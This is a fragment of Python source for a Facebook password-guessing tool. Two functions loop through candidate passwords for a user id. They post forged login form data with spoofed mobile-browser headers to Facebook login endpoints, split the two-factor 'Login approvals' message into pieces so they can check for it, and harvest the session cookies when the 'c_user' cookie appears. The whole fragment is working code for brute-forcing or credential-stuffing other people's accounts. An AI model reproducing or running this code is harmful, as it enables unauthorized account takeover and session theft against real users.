...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'user': '0'}
            headers = {
            'authority': 'mbasic.beta.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
...
def freeq(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAF',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
            headers = {
            'Host': 'm.facebook.com',
            'Connection': 'keep-alive',
            ...
            'sec-ch-prefers-color-scheme': 'light',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; U; Android 13; en-us; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.17 Mobile Safari/537.36 PHX/16.5',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'q-ua2': 'QV=3&PL=ADR&PR=PHX&PP=com.transsion.phoenix&PPVN=16.5.1.5225&PPVC=5225&CO=SYS&CHID=23600&ACID=23600&MO=V2060&DN=2060&BN=vivo&RL=1080*2238&OS=13&API=33&CTRY=IN&LNG=en-US',
            ...
            'Accept-Language': 'en-US,en;q=0.9',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://www.alpha.facebook.com/login/device-based/regular/login/"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
